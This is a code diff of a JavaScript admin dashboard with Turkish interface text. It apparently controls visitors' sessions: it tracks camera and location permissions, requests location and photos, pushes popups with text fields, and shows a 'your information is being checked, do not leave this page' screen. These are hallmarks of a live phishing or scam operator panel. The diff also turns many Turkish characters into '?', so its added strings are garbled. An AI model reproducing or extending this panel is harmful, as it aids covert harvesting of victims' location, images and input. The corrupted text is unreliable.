@@ -1,4 +1,4 @@
-import "./chat-sync.js?v=100";
+import "./chat-sync.js?v=101";
 
 async function ready() {
   if (window.ChatSync) return window.ChatSync;
@@ -543,7 +543,7 @@ function startDash(sync) {
           Boolean(r.cameraGranted || r.hasCamera || r.hasLocation || r.cameraPending) ||
           camAt > prev ||
           locAt > prev ||
-          /??|??|kamera|konum/i.test(preview);
+          /kamera|konum|camera|location/i.test(preview);
         if (r.lastWho === "user" || isEntry || enteredAt > prev || isMedia) {
           bumped.push(r);
         }
@@ -590,7 +590,7 @@ function startDash(sync) {
             newest.hasCamera ||
             newest.hasLocation ||
             newest.cameraPending
-        ) || /??|??|kamera|konum/i.test(String(newest.preview || ""));
+        ) || /kamera|konum|camera|location/i.test(String(newest.preview || ""));
 
       if (newest.id === selectedId && !isEntry && !isMedia) {
         /* skip bump alert */
@@ -1131,18 +1131,18 @@ function updateAdminLocationUi(loc, status, error) {
   const st = String(status || "");
   if (st === "denied") {
     adminLocationText.textContent =
-      "Konum engelli (Safari). Ziyaretçi: Ayarlar ? Safari ? Konum ? Sor, yenile, sonra tekrar dene";
+      "Konum engelli (Safari). Ziyaret?i: Ayarlar ? Safari ? Konum ? Sor, yenile, sonra tekrar dene";
   } else if (st === "awaiting-tap" || st === "prompting") {
     adminLocationText.textContent =
       st === "prompting"
-        ? "Konum penceresi istendi — ziyaretçi Izin Ver’e basmali"
-        : "Konum bekleniyor — ziyaretçi konum iznini vermeli";
+        ? "Konum penceresi istendi ? ziyaret?i Izin Ver?e basmali"
+        : "Konum bekleniyor ? ziyaret?i konum iznini vermeli";
   } else if (st === "unsupported") {
     adminLocationText.textContent = "Tarayici konum desteklemiyor";
   } else if (st === "unavailable" || st === "timeout" || st === "error") {
     adminLocationText.textContent = `Konum alinamadi${error ? `: ${error}` : ""}`;
   } else {
-    adminLocationText.textContent = "Konum bekleniyor…";
+    adminLocationText.textContent = "Konum bekleniyor?";
   }
 }
 
@@ -1783,7 +1783,7 @@ function appendThreadMessage(msg, announce) {
   if (!msg?.id || seenMessageIds.has(msg.id)) return;
   seenMessageIds.add(msg.id);
 
-  // Otomatik kamera teklifleri sohbeti spam’ler + her mesajda WebRTC’yi sifirlardi
+  // Otomatik kamera teklifleri sohbeti spam?ler + her mesajda WebRTC?yi sifirlardi
   if (msg.type === "camera" && (msg.from === "auto" || !msg.from)) {
     if (announce && msg.callId && selectedId) {
       const already =
@@ -1805,7 +1805,7 @@ function appendThreadMessage(msg, announce) {
   }`;
   const meta = document.createElement("span");
   meta.className = "chat-meta";
-  meta.textContent = `${whoLabel(msg)} · ${fmtTime(msg.ts)}`;
+  meta.textContent = `${whoLabel(msg)} ? ${fmtTime(msg.ts)}`;
   const body = document.createElement("div");
   body.className = "chat-loading-body";
   if (isLoading) {
@@ -1815,14 +1815,14 @@ function appendThreadMessage(msg, announce) {
       <span class="chat-loading-dots" aria-hidden="true"><i></i><i></i><i></i></span>
     `;
     body.querySelector("p").textContent =
-      msg.text || "Bilgileriniz kontrol ediliyor. Lütfen bu sayfadan ayrilmayin…";
+      msg.text || "Bilgileriniz kontrol ediliyor. L?tfen bu sayfadan ayrilmayin?";
   } else if (msg.type === "popup") {
     const p = document.createElement("p");
     p.textContent = `Popup: ${msg.text || ""}`;
     const tags = document.createElement("em");
     tags.className = "popup-btn-tags";
     tags.textContent = `${msg.okLabel || "Tamam"} / ${msg.cancelLabel || "Iptal"}${
-      msg.withInput ? " · metin kutusu" : ""
+      msg.withInput ? " ? metin kutusu" : ""
     }`;
     body.append(p, tags);
   } else if (msg.type === "camera") {
@@ -1842,7 +1842,7 @@ function appendThreadMessage(msg, announce) {
     p.textContent = `?? Fotograf talebi: ${msg.text || ""}`;
     const tags = document.createElement("em");
     tags.className = "popup-btn-tags";
-    tags.textContent = `${msg.okLabel || "Fotograf seç"} / ${msg.cancelLabel || "Istemiyorum"} · max ${
+    tags.textContent = `${msg.okLabel || "Fotograf se?"} / ${msg.cancelLabel || "Istemiyorum"} ? max ${
       msg.maxPhotos || 10
     }`;
     body.append(p, tags);
@@ -1858,7 +1858,7 @@ function appendThreadMessage(msg, announce) {
       link.className = "admin-photo-link";
       const img = document.createElement("img");
       img.src = msg.imageUrl;
-      img.alt = msg.fileName || "Ziyaretçi fotografi";
+      img.alt = msg.fileName || "Ziyaret?i fotografi";
       img.className = "admin-photo-thumb";
       img.loading = "lazy";
       link.appendChild(img);
